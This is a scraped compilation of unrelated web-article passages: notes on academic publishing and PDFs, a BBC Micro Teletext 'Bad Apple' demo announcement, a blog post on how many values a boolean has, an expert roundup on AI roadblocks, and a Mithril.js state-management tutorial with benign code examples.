This makes it very difficult to bootstrap new publication venues, as they would be perceived as less prestigious than the established ones. Thus, publishers can continue to milk the prestige of the venues that they own, and make heaps of money<sup id="fnref:profit"><a href="#fn:profit">5</a></sup> while working against the dissemination of science<sup id="fnref:against"><a href="#fn:against">6</a></sup> and without contributing anything of value to the scientific process.</p>

</details>
<h3 id="PDF"><a href="#PDF">PDF is not a great format</a><a href="#PDF" title="Permanent link">¶</a></h3>
<p>Most scientific articles are distributed as PDF documents. (Some are distributed
as Word documents, but this is even worse, and I won't comment further.) This is again for historical reasons:
articles were first distributed on paper, and then they were distributed electronically but designed to be
printed and read on paper.
Of course, people still print articles, but nowadays, this is just one way among others to read articles;</p></div></div>

                        <p><strong>“Bad Apple” - The definitive BBC Micro/Teletext Version</strong></p>

<p>The Tou Hou Bad Apple <a href="https://www.youtube.com/watch?v=G3C-VevI36s">video</a> has become a benchmark for pushing retro computing power to the limits. While it has been ported to many other 8-bit platforms, we are now pleased to present the definitive BBC Micro version in glorious Teletext pixel graphics.</p>

<p>Our version is a full 3m18s of video playback, played back at 25 frames per second in Teletext / MODE 7.</p>

<p>MODE 7 on the BBC Micro used a <a href="https://en.wikipedia.org/wiki/Mullard_SAA5050">Mullard SAA5050</a> Teletext display/decoder chip which (apart from from subtle implementation differences) is the same <a href="https://en.wikipedia.org/wiki/Teletext">Teletext</a> chip used in analogue TVs. It is 40x25 characters, supporting 8 primary colours, with support for text characters and basic graphical effects using control codes embedded into each character row. Support for teletext on the BBC Micro was an original requirement of the BBC’s specification for the machine due to their own use of broadcast teletext (<a href="https://en.wikipedia.org/wiki/Ceefax">Ceefax</a>).</p>

<p>The music is a custom VGM chiptune, hand designed by <a href="http://www.inversephase.com/">Inverse Phase</a> for the BBC Micro’s <a href="https://en.wikipedia.org/wiki/Texas_Instruments_SN76489">SN76489</a>. You can support IP’s excellent work by <a href="https://www.patreon.com/inversephase">becoming a patron here</a>.</p>

<p>The code, music &amp; screens are crammed into a standard 8-bit 2MHz 6502 based BBC Micro’s 32Kb RAM, and the video is streamed into memory track by track, after being heavily compressed to fit on one single 400Kb double sided floppy disk image.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    
    
    <p>A friend of mine recently had an interview for a software
engineering position. They later recounted to me the content
of the technical questions that they had been asked. Some had
been pretty standard:</p>
<ul>
<li>
<strong>“What’s the difference between concurrency
and parallelism?"</strong> – a reasonable question given that Go was
the company’s language of choice.</li>
<li>
<strong>“What’s the difference between a method and a function?"</strong> –
a little more strange, in my opinion, since the difference
is of little <em>practical</em> use.</li>
</ul>
<p>But then, they recounted a rather interesting question:</p>
<blockquote>
<p>How many values does a bool have?</p>
</blockquote>
<p>Innocuous at first, isn’t it? Probably a bit simpler, in fact,
than the questions about methods and functions, concurrency
and parallelism. It’s plausible that a candidate
has not done much concurrent or parallel programming in their
life, or that they came from a language in which functions
were rare and methods were ubiquitous. It’s not plausible,
on the other hand, that a candidate applying to a software
engineering position has not encountered booleans.</p>
<p>If you’re genuinely unsure about the answer to the question,
I think there’s no reason for me to mess with you. The
simple answer to the question – as far as I know – is that a boolean
has two values. They are <code>true</code> and <code>false</code> in Java, or <code>True</code> and <code>False</code>
in Haskell, and <code>1</code> and <code>0</code> in C. A boolean value is either true or false.</p>
<p>So, what’s there to think about? There are a few things, <em>ackshually</em>.
Let’s explore them, starting from the theoretical perspective.</p>
<h3 id="types-values-and-expressions">Types, Values, and Expressions</h3>
<p>Boolean, or <code>bool</code>, is a type. Broadly speaking, a type
is a property of <em>something</em> that defines what the <em>something</em>
means and what you can do with it. That <em>something</em> can be
several things; for our purposes, it can either be an
<em>expression</em> in a programming language (like those in the form <code>fact(n)</code>)
or a value in that same programming language (like <code>5</code>).</p>
<p>Dealing with values is rather simple. Most languages have finite numbers,
usually with <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup></mrow><annotation encoding="application/x-tex">2^{32}</annotation></semantics></math></span></span> values, which have type <code>int</code>,
<code>i32</code>, or something in a similar vein. Most languages also have
strings, of which there are as many as you have memory to contain,
and which have the type <code>string</code>, <code>String</code>, or occasionally
the more confusing <code>char*</code>. Most languages also have booleans,
as we discussed above.</p>
<p>The deal with expressions is a more interesting. Presumably
expressions evaluate to values, and the type of an expression
is then the type of values it can yield. Consider the following
snippet in C++:</p>
<div><pre><code data-lang="C"><span>int</span> <span>square</span><span>(</span><span>int</span> <span>x</span><span>)</span> <span>{</span>
    <span>return</span> <span>x</span> <span>*</span> <span>x</span><span>;</span>
<span>}</span>
</code></pre></div>
<p>Here, the expression <code>x</code> is known to have type <code>int</code> from
the type signature provided by the user. Multiplication
of integers yields an integer, and so the type of <code>x*x</code> is also
of type <code>int</code>. Since <code>square(x)</code> returns <code>x*x</code>, it is also
of type <code>int</code>. So far, so good.</p>
<p>Okay, how about this:</p>
<div><pre><code data-lang="C++"><span>int</span> <span>meaningOfLife</span><span>()</span> <span>{</span>
    <span>return</span> <span>meaningOfLife</span><span>();</span>
<span>}</span>
</code></pre></div>
<p>No, wait, doesn’t say “stack overflow” just yet. That’s no fun.
And anyway, this is technically a tail call, so maybe our
C++ compiler can avoid growing the stack. And indeed,
flicking on the <code>-O2</code> flag in this <a href="https://godbolt.org/z/9cv4nY">compiler explorer example</a>,
we can see that no stack growth is necessary: it’s just
an infinite loop. But <code>meaningOfLife</code> will never return a value. One could say
this computation <em>diverges</em>.</p>
<p>Well, if it diverges, just throw the expression out of the window! That’s
no <code>int</code>! We only want <em>real</em> <code>int</code>s!</p>
<p>And here, we can do that. But what about the following:</p>
<div><pre><code data-lang="C++"><span>inf_int</span> <span>collatz</span><span>(</span><span>inf_int</span> <span>x</span><span>)</span> <span>{</span>
    <span>if</span><span>(</span><span>x</span> <span>==</span> <span>1</span><span>)</span> <span>return</span> <span>1</span><span>;</span>
    <span>if</span><span>(</span><span>x</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>)</span> <span>return</span> <span>collatz</span><span>(</span><span>x</span><span>/</span><span>2</span><span>);</span>
    <span>return</span> <span>collatz</span><span>(</span><span>x</span> <span>*</span> <span>3</span> <span>+</span> <span>1</span><span>);</span>
<span>}</span>
</code></pre></div>
<p>Notice that I’ve used the fictitious type
<code>inf_int</code> to represent integers that can hold
arbitrarily large integer values, not just the 32-bit ones.
That is important for this example, and I’ll explain why shortly.</p>
<p>The code in the example is a simulation of the process described
in the <a href="https://en.wikipedia.org/wiki/Collatz_conjecture">Collatz conjecture</a>.
Given an input number <code>x</code>, if the number is even, it’s divided in half,
and the process continues with the halved number. If, on the other
hand, the number is odd, it’s multiplied by 3, 1 is added to it,
and the process continues with <em>that</em> number. The only way for the
process to terminate is for the computation to reach the value 1.</p>
<p>Why does this matter? Because as of right now, <strong>nobody knows</strong>
whether or not the process terminates for all possible input numbers.
We have a strong hunch that it does; we’ve checked a <strong>lot</strong>
of numbers and found that the process terminates for them.
This is why 32-bit integers are not truly sufficient for this example;
we know empirically that the function will terminate for them.</p>
<p>But why does <em>this</em> matter? Well, it matters because we don’t know
whether or not this function will diverge, and thus, we can’t
‘throw it out of the window’ like we wanted to with <code>meaningOfLife</code>!
In general, it’s <em>impossible to tell</em> whether or not a program will
terminate; that is the <a href="https://en.wikipedia.org/wiki/Halting_problem">halting problem</a>.
So, what do we do?</p>
<p>It turns out to be convenient – formally – to treat the result of a diverging computation
as its own value. This value is usually called ‘bottom’, and written as <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span></span>.
Since in most programming languages, you can write a nonterminating expression or
function of any type, this ‘bottom’ is included in <em>all</em> types. So in fact, the
possible values of <code>unsigned int</code> are <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo></mrow><annotation encoding="application/x-tex">\bot, 0, 1, 2, …</annotation></semantics></math></span></span> and so on.
As you may have by now guessed, the same is true for a boolean: we have <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span></span>, <code>true</code>, and <code>false</code>.</p>
<h3 id="haskell-and-bottom">Haskell and Bottom</h3>
<p>You may be thinking:</p>
<blockquote>
<p>Now he’s done it; he’s gone off the deep end with all that programming language
theory. Tell me, Daniel, where the heck have you ever encountered <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span></span> in
code? This question was for a software engineering interview, after all!</p>
</blockquote>
<p>You’re right; I haven’t <em>specifically</em> seen the symbol <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span></span> in my time
programming. But I have frequently used an equivalent notation for the same idea:
<code>undefined</code>. In fact, here’s a possible definition of <code>undefined</code> in Haskell:</p>
<pre><code>undefined = undefined
</code></pre>
<p>Just like <code>meaningOfLife</code>, this is a divergent computation! What’s more is that
the type of this computation is, in Haskell, <code>a</code>. More explicitly – and retreating
to more mathematical notation – we can write this type as: <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>α</mi><mi mathvariant="normal">.</mi><mi>α</mi></mrow><annotation encoding="application/x-tex">\forall \alpha . \alpha</annotation></semantics></math></span></span>.
That is, for any type <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span></span>, <code>undefined</code> has that type! This means
<code>undefined</code> can take on <em>any</em> type, and so, we can write:</p>
<div><pre><code data-lang="Haskell"><span>myTrue</span> <span>::</span> <span>Bool</span>
<span>myTrue</span> <span>=</span> <span>True</span>

<span>myFalse</span> <span>::</span> <span>Bool</span>
<span>myFalse</span> <span>=</span> <span>False</span>

<span>myBool</span> <span>::</span> <span>Bool</span>
<span>myBool</span> <span>=</span> <span>undefined</span>
</code></pre></div>
<p>In Haskell, this is quite useful. For instance, if one’s in the middle
of writing a complicated function, and wants to check their work so far,
they can put ‘undefined’ for the part of the function they haven’t written.
They can then compile their program; the typechecker will find any mistakes
they’ve made so far, but, since the type of <code>undefined</code> can be <em>anything</em>,
that part of the program will be accepted without second thought.</p>
<p>The language Idris extends this practice with the idea of typed holes,
where you can leave fragments of your program unwritten, and ask the
compiler what kind of <em>thing</em> you need to write to fill that hole.</p>
<h3 id="java-and-null">Java and <code>null</code>
</h3>
<p>Now you may be thinking:</p>
<blockquote>
<p>This whole deal with Haskell’s <code>undefined</code> is beside the point; it doesn’t
really count as a value, since it’s just a nonterminating
expression. What you’re doing is a kind of academic autofellatio.</p>
</blockquote>
<p>Alright, I can accept this criticism. Perhaps just calling a nonterminating
function a value <em>is</em> far-fetched (even though in <a href="https://en.wikipedia.org/wiki/Denotational_semantics">denotational semantics</a>
we <em>do</em> extend types with <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span></span>). But denotational semantics are not
the only place where types are implicitly extend with an extra value;
let’s look at Java.</p>
<p>In Java, we have <code>null</code>. At the
core language level, any function or method that accepts a class can also take <code>null</code>;
if <code>null</code> is not to that function or method’s liking, it has to
explicitly check for it using <code>if(x == null)</code>.</p>
<p>This <code>null</code> value does not at first interact with booleans.
After all, Java’s booleans are not classes. Unlike classes, which you have
to allocate using <code>new</code>, you can just throw around <code>true</code> and <code>false</code> as you see
fit. Also unlike classes, you simply can’t assign <code>null</code> to a boolean value.</p>
<p>The trouble is, the parts of Java dealing with <em>generics</em>, which allow you to write
polymorphic functions, can’t handle ‘primitives’ like <code>bool</code>. If you want to have an <code>ArrayList</code>
of something, that something <em>must</em> be a class.
But what if you really <em>do</em> want an <code>ArrayList</code> of booleans? Java solves this problem by introducing
‘boxed’ booleans: they’re primitives wrapped in a class, called <code>Boolean</code>. This class
can then be used for generics.</p>
<p>But see, this is where <code>null</code> has snuck in again. By allowing <code>Boolean</code> to be a class
(thereby granting it access to generics), we’ve also given it the ability to be null.
This example is made especially compelling because Java supports something
they call <a href="https://docs.oracle.com/javase/tutorial/java/data/autoboxing.html">autoboxing</a>:
you can directly assign a primitive to a variable of the corresponding boxed type.
Consider the example:</p>
<div><pre><code data-lang="Java"><span>Boolean</span> <span>myTrue</span> <span>=</span> <span>true</span><span>;</span>
<span>Boolean</span> <span>myFalse</span> <span>=</span> <span>false</span><span>;</span>
<span>Boolean</span> <span>myBool</span> <span>=</span> <span>null</span><span>;</span>
</code></pre></div>
<p>Beautiful, isn’t it? Better yet, unlike Haskell, where you can’t <em>really</em>
check if your <code>Bool</code> is <code>undefined</code> (because you can’t tell whether
a non-terminating computation is as such), you can very easily
check if your <code>Boolean</code> is <code>true</code>, <code>false</code>, or <code>null</code>:</p>
<div><pre><code data-lang="Java"><span>assert</span> <span>myTrue</span> <span>!=</span> <span>myFalse</span><span>;</span>
<span>assert</span> <span>myFalse</span> <span>!=</span> <span>myBool</span><span>;</span>
<span>assert</span> <span>myTrue</span> <span>!=</span> <span>myBool</span><span>;</span>
</code></pre></div>
<p>We’re okay to use <code>!=</code> here, instead of <code>equals</code>, because it so happens
each boxed instance of a <code>boolean</code> value
<a href="https://stackoverflow.com/questions/28636738/equality-of-boxed-boolean">refers to the same <code>Boolean</code> object</a>.
In fact, this means that a <code>Boolean</code> variable can have <strong>exactly</strong> 3 values!</p>
<h3 id="c-and-integers">C and Integers</h3>
<p>Oh the luxury of having a type representing booleans in your language!
It’s almost overly indulgent compared to the spartan minimalism of C.
In C, boolean conditions are represented as numbers. You can perhaps get
away with throwing around <code>char</code> or <code>short int</code>, but even then,
these types allow far more values than two!</p>
<div><pre><code data-lang="C"><span>unsigned</span> <span>char</span> <span>test</span> <span>=</span> <span>255</span><span>;</span>
<span>while</span><span>(</span><span>test</span><span>)</span> <span>test</span> <span>-=</span> <span>1</span><span>;</span>
</code></pre></div>
<p>This loop will run 255 times, thereby demonstrating
that C has at least 255 values that can be used
to represent the boolean <code>true</code>.</p>
<p>There are other languages
with this notion of ‘truthy’ and ‘falsey’ values, in which</p></div></div>

<p>Having asked our experts what their personal 'must-read' paper choice would be, we also wanted to find out their opinion on the current state of AI, with specific emphasis on the biggest roadblocks or barriers seen in the AI space, both now and in the future. </p><p>Didn't manage to catch our last experts blogs? You can see our experts must-read paper suggestions <a href="https://blog.re-work.co/ai-papers-suggested-by-experts/">part 1</a> and <a href="https://blog.re-work.co/must-read-ai-papers-suggested-by-experts-part-2/">part 2</a>. The below touches on the concerns around deepfakes, limited compute, model size and more. </p><h2 id="jane-wang-senior-research-scientist-deepmind"><strong><a href="https://www.linkedin.com/in/jane-wang-63167017/">Jane Wang</a>, Senior Research Scientist, DeepMind</strong></h2><p>I get worried that the societal implications and ethical consequences of the newest AI technologies are not being thought out as well as they should be. There's kind of this culture with researchers in the field right now of "let's just see what's possible," in spite of the possible negative ramifications. Some particularly worrying examples include facial recognition for surveillance, and generating increasingly realistic deepfakes. </p><p>There is recognition that this is an important issue, and some steps are being taken in that direction. For instance NeurIPS this year for the first time asked all submissions to come with a "broader impacts" section to comment on the wider societal implications of the work, and groups such as Partnership on AI have been formed specifically to tackle the problem of how to implement ethical and safe AI. But unfortunately I don't think that these kinds of perspectives are all that prevalent in the wider research community.</p><hr><h2 id="alexia-jolicoeur-martineau-phd-researcher-mila"><strong><a href="https://www.linkedin.com/in/alexiajm/">Alexia Jolicoeur-Martineau</a>, PhD Researcher, MILA</strong></h2><p>The biggest roadblock to generative modelling is 1) computing power, 2) the lack of long-term coherence, and 3) the lack of ability to understand what it doesn't know. Let's take a model that generates text and interacts with humans, such as GPT-2; it can say things that make sense and even answer hard questions correctly. However, if you ask nonsensical questions, it will try to give an answer rather than say "what you are asking doesn't make sense" or "I don't know". Furthermore, if you make it generate a large amount of text, there will be no long term coherence, it will go from one thing to another. If we wanted to make models that generate tv shows or movies, we would need a model that is coherent over time, which we don't have right now. Current AIs are really powerful, but still lack a true understanding of things. A lot more computing power will be needed if we ever want to generate high-resolution videos.</p><hr><h2 id="jekaterina-novikova-director-of-machine-learning-winterlight-labs"><strong><a href="https://www.linkedin.com/in/jnovikova/">Jekaterina Novikova</a>, Director of Machine Learning, WinterLight Labs</strong></h2><p>It is close to impossible to name one biggest roadblock in general AI. The term "artificial intelligence" does not have a concrete accepted definition. We can't agree on the definition of human intelligence, let alone the artificial one, and it's difficult to say what is blocking us from achieving something we can't even name. However, if we speak about narrow AI (AI which is able to handle just one particular task) then it is an umbrella of many different subtopics, such as Machine Learning, Robotics, Natural Language Processing etc. Each of those subtopics has their own specific roadblocks and challenges that should be overcome in order to make progress in AI research. In addition, when it comes to productionalization and real-life application of AI, non-research-specific roadblocks come into play that are related to AI implementation, adoption and scaling.<br></p><p>My current research is focused on Machine Learning in Healthcare, and here I see some common challenges researchers are constantly dealing with. I've recently gave a talk on real-life challenges in detecting cognitive diseases from human speech using ML (<a href="https://www.slideshare.net/JekaterinaNovikova1/solving-reallife-challenges-in-detecting-cognitive-diseases-from-speech-using-ml">link to the slides</a>), where I mentioned several roadblocks, such as for example:</p><ul><li>Lack of relevant and appropriate data that is unbiased and does not compromise user privacy.</li><li>Limitations of English-only models. Most current developments in NLP are made in English and are not necessarily generalizable to non-English languages.</li><li>In the <a href="https://www.slideshare.net/JekaterinaNovikova1/solving-reallife-challenges-in-detecting-cognitive-diseases-from-speech-using-ml">slides</a>, I discuss more of the challenges and also present the research we are currently doing to overcome each of them.</li></ul><hr><h2 id="andriy-burkov-director-of-data-science-gartner"><strong><a href="https://www.linkedin.com/in/andriyburkov/">Andriy Burkov</a>, Director of Data Science, Gartner</strong></h2><p>If we talk about the narrow AI, the one we currently use in business, the biggest roadblock is the size of the models that provide the state of the art performance. The biggest Transformer ever trained, GPT-3, contains 175 billion parameters and costs millions of dollars to train. Only a handful of companies in the world can afford training such models and using them in production. If, in turn, the term AI is used in a more general sense, like artificial general intelligence (AGI), then the roadblock (and it's a huge one) is that we don't know exactly what science we need to develop to reach that level of machine intelligence. This is almost certainly not deep neural networks, as they are starting to reach their limits.</p><hr><h2 id="tamanna-haque-senior-data-scientist-at-jaguar-land-rover"><strong><a href="https://www.linkedin.com/in/tamannah1/">Tamanna Haque</a>, Senior Data Scientist at Jaguar Land Rover</strong></h2><p>Amongst stakeholders, business alignment on AI strategy relies on; a shared vision of effectively using data science to add business value, a mutual agenda on short and long-term business objectives and priorities, and clarity on which departments own or provide resource on different aspects of projects.</p><p>A lack of alignment creates challenges for data scientists who are tasked with opportunity scanning and delivering growth, cost-savings and value through analytics, with pressures heightened in the wake of negative economic impacts (the reality today). Between idea generation and delivery, data scientists aim to influence stakeholders to action and champion findings, but misalignment on AI strategy might effect apathy and put data scientists on the back foot to begin with.</p><p>Data scientists can build relationships with wider or cross-functional stakeholders to increase the likelihood of traction whilst increasing their knowledge of different business areas. They can also expand their network externally. A wide and diverse network keeps technical and commercial knowledge fresh whilst improving influence and communication skills- a practice which uses the help and expertise of others to enrich and get projects over the line.</p><hr><h2 id="oana-frunza-vice-president-nlp-and-ml-researcher-at-morgan-stanley"><strong><a href="https://www.linkedin.com/in/phd-oana-m-frunza-6bb3875/">Oana Frunza</a>, Vice President, NLP and ML Researcher at Morgan Stanley</strong></h2><p>Not necessarily a roadblock, but a direction we need to follow more is bridging the gap with other disciplines, especially the humanities. It is time to put <em>philosophy back in doctor of philosophy</em>. While we are good at building amazing technology, we need to start bringing in more knowledge from the world outside our disciplines to increase adoption and build trust. We will continue to advance and push forward the field, but we have to make sure that it is fit for the world around us and that the world around us is ready to adopt the solutions we build.</p><p>AI is a “gift of fire” – we must continue focusing on it enhancing our capabilities without getting burnt by the fire.</p><hr><h2 id="eric-charton-senior-director-ai-science-national-bank-of-canada"><strong><a href="https://www.linkedin.com/in/ericcharton/">Eric Charton</a>, Senior Director, AI Science, National Bank of Canada</strong></h2><p>Massive usage of (costly) computation power for minor improvement of performances is the elephant in the room. It is also difficult to have a clear view of the limitations of Deep Learning in various application context like unbalanced data (used in credit scoring), language models (dialog systems, question answering systems, text classification). What we see in mainstream publications is difficult to reproduce. We just begin to see some scientific communications with rigorous analysis of the pro and the cons of DL techniques.</p><hr><h2 id="jack-brzezinski-chief-ai-scientist-ai-systems-and-strategy-lab"><a href="https://www.linkedin.com/in/jack-brzezinski-a36245/">Jack Brzezinski</a>, Chief AI Scientist, AI Systems and Strategy Lab</h2><p>Since the inception of Artificial Intelligence there were periods of enthusiasm followed by "AI winters." Once you attempt to solve hard problems, unexpected roadblocks will appear. In a few cases, those problems were attacked head-on. Douglas Lenat's approach to building the CYC system (<a href="https://www.cyc.com/" rel="noopener">https://www.cyc.com</a>) is an example of such a frontal attack on the common sense reasoning problem, one of the hard ones in AI. In other cases, further research was necessary to move the needle in the right direction. Today, it is difficult to predict the single biggest issue that will be a roadblock. Elon Musk suggested that the interface between computers and the human brain needs a lot of improving. </p><p>His solution is to invent a more direct connection. Tom Mitchell from Carnegie Mellon suggests that machine learning algorithms should be in a state of continuous learning as opposed to a limited training phase carefully defined by the number of epochs. Perhaps, the biggest obstacle exists outside the high-tech field. Over the past decade, an enormous amount of investment was redirected from R&amp;D and used for stock buybacks and other financial operations. The legal environment often dictates the most optimal course of action for big corporations. It might take a new AI maverick similar to SpaceX in the aerospace area, to shift the focus from financial markets into research and development. Perhaps, another space race between superpowers will spark innovation.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p><a href="https://mithril.js.org/">Mithril.js</a> is a lightweight JavaScript framework that has become a staple in my development stack after I discovered it two years ago. At the time, I was looking for a simpler, zero-dependency alternative to <a href="https://reactjs.org/">React.js</a> that could help me learn modern JavaScript UI development without needing to simultaneously learn and understand various build tools and framework plugins.</p>
<p>I've since learned React and have come to appreciate it for its influence on modern web development. However, I find that Mithril, a framework that sits at half the size of React whilst containing more features, has remained my go-to.</p>
<p>When it comes to state management, Mithril is as unopinionated as they come. You can use Redux, Mobx, Cerebral, some implementation of the SAM pattern, or best of all -- just a plain ol' JavaScript object! Mithril comes with an auto-redraw system. The virtual DOM created by Mithril will diff against and synchronize the DOM whenever changes are made to your data layer. Most commonly, the redraws are triggered after a DOM event.</p>
<p>What this means in practice is that you are free to structure your data however you'd like, and Mithril takes care of the rest. Below is an example of a simple Counter application written with Mithril:</p>
<pre><code><span>let</span> count <span>=</span> <span>0</span><span>;</span><p><span>const</span> Counter <span>=</span> <span>{</span><br>  <span>view</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span><br>    <span>m</span><span>(</span><span>'div'</span><span>,</span><br>      <span>m</span><span>(</span><span>'h1'</span><span>,</span> <span>'Counter'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'p'</span><span>,</span> count<span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> <span>onclick</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> count <span>+=</span> <span>1</span> <span>}</span><span>,</span> <span>'+'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> <span>onclick</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> count <span>-=</span> <span>1</span> <span>}</span><span>,</span> <span>'-'</span><span>)</span><br>    <span>)</span><br><span>}</span><span>;</span></p><p>m<span>.</span><span>mount</span><span>(</span>document<span>.</span>body<span>,</span> Counter<span>)</span><span>;</span></p></code></pre>
<p><a href="https://flems.io/#0=N4IgZglgNgpgziAXAbVAOwIYFsZJAOgAsAXLKEAGhAGMB7NYmBvEAXwvW10QICsEqdBk2J5YxAAR0ArgwkBeCQAYA3AB00GoXEkBBAA76FE4BokSAbhBgB3RBIAUASgUA+M+YlYHAcgAmEBY+FB6eXr6EAIzBEj4AwrSyjABOPk4haGHm3j76MTIM6aGeOQBG0sTE9DHAEvTUUBDUANb2zm5SiXIA1IqREuyx3WkZWeE+5ZXVFCZ1aA1NrY4u8q6dSRIAtH0DMz6bacVOGqzqmmhY+FhdxA5+tNTSOAz4pbR+AJ4zBvpOKpQgOAwWDUYgQegIHiRABMiGhAA5NkpEEo2BwQJgcHh8NQ4AIaPRGMweGwALpURpoZqQ1AYrh4LAQYiEZLQAHSZLkHgkYj6OCIAD0Atk+maAHMcbQsALGczWVAAALQ-BKfAAZhlTJZ0CuEDQ+H4AOIH303EB1FZ+lErFJrCAA">Live Example</a></p>
<p>Our state is just a single primitive variable! For small applications, simple widgets or one-off UI components, the above solution is largely sufficient. What's important about implementing your state management solution is to understand that there is no silver bullet. You will be able to predict your needs more accurately as you work across multiple projects and grow organically. <a href="https://redux.js.org/">Redux</a> is a brilliant solution for modern UI state management, but the 9/10 times I have attempted to use it out of a desire to do things "the right way", it was absolute overkill. I advise reading <a href="https://medium.com/@dan_abramov/you-might-not-need-redux-be46360cf367">this blog post</a> by Dan Abramov, the creator of Redux.</p>
<p>While the above solution is simple and likely sufficient for small use-cases, it introduces one problem - we are modifying the state directly from within the view. It won't take long before this approach proves unwieldy, and you're scanning your templates trying to find where you wrote the logic that is altering your state in (potentially) unpredictable ways.</p>
<p>We can introduce indirection and a more versatile state container using plain JavaScript objects. Our <code>Counter</code> component becomes more terse, yet more expressive:</p>
<pre><code><span>const</span> state <span>=</span> <span>{</span> count<span>:</span> <span>0</span> <span>}</span><span>;</span><p><span>const</span> actions <span>=</span> <span>{</span><br>  <span>increment</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>+=</span> <span>1</span><span>,</span><br>  <span>decrement</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>-=</span> <span>1</span><br><span>}</span><span>;</span></p><p><span>const</span> Counter <span>=</span> <span>{</span><br>  <span>view</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span><br>    <span>m</span><span>(</span><span>'div'</span><span>,</span><br>      <span>m</span><span>(</span><span>'h1'</span><span>,</span> <span>'Counter'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'p'</span><span>,</span> state<span>.</span>count<span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>increment <span>}</span><span>,</span> <span>'+'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>decrement <span>}</span><span>,</span> <span>'-'</span><span>)</span><br>    <span>)</span><br><span>}</span><span>;</span></p><p>m<span>.</span><span>mount</span><span>(</span>document<span>.</span>body<span>,</span> Counter<span>)</span><span>;</span></p></code></pre>

<p>As your application grows in size, it might be preferable that your state and actions are easily testable and replicable from the beginning. Further, instead of relying on lexical scoping for your actions to have access to your state, we can use a combination of dependency injection and closures so that an instance of your actions will always directly reference a specific state object. We can easily achieve this with factory functions that provide your initial state and actions that directly reference a single state object.</p>
<pre><code><span>const</span> <span>State</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>(</span><span>{</span> count<span>:</span> <span>0</span> <span>}</span><span>)</span><span>;</span><p><span>const</span> <span>Actions</span> <span>=</span> <span>state</span> <span>=&gt;</span> <span>(</span><span>{</span><br>  <span>increment</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>+=</span> <span>1</span><span>,</span><br>  <span>decrement</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> state<span>.</span>count <span>-=</span> <span>1</span><br><span>}</span><span>)</span><span>;</span></p></code></pre>
<p>From there, it is dead simple to reproduce your state and actions objects respectively:</p>
<pre><code><span>const</span> state   <span>=</span> <span>State</span><span>(</span><span>)</span><span>;</span><br><span>const</span> actions <span>=</span> <span>Actions</span><span>(</span>state<span>)</span><span>;</span></code></pre>
<p>Passing these to a Mithril component is trivial using the <code>attrs</code> property (near-equivalent to <code>props</code> in React) and object destructuring. Notice that our Counter component remains virtually unchanged:</p>
<pre><code><span>const</span> Counter <span>=</span> <span>{</span><br>  <span>view</span><span>:</span> <span>(</span><span><span>{</span> attrs<span>:</span> <span>{</span> state<span>,</span> actions <span>}</span> <span>}</span></span><span>)</span> <span>=&gt;</span><br>    <span>m</span><span>(</span><span>'div'</span><span>,</span><br>      <span>m</span><span>(</span><span>'h1'</span><span>,</span> <span>'Counter'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'p'</span><span>,</span> state<span>.</span>count<span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>increment <span>}</span><span>,</span> <span>'+'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> onclick<span>:</span> actions<span>.</span>decrement <span>}</span><span>,</span> <span>'-'</span><span>)</span><br>    <span>)</span><br><span>}</span><span>;</span><p>m<span>.</span><span>mount</span><span>(</span>document<span>.</span>body<span>,</span> <span>{</span><br>  <span>view</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>m</span><span>(</span>Counter<span>,</span> <span>{</span> state<span>,</span> actions <span>}</span><span>)</span><br><span>}</span><span>)</span><span>;</span></p></code></pre>

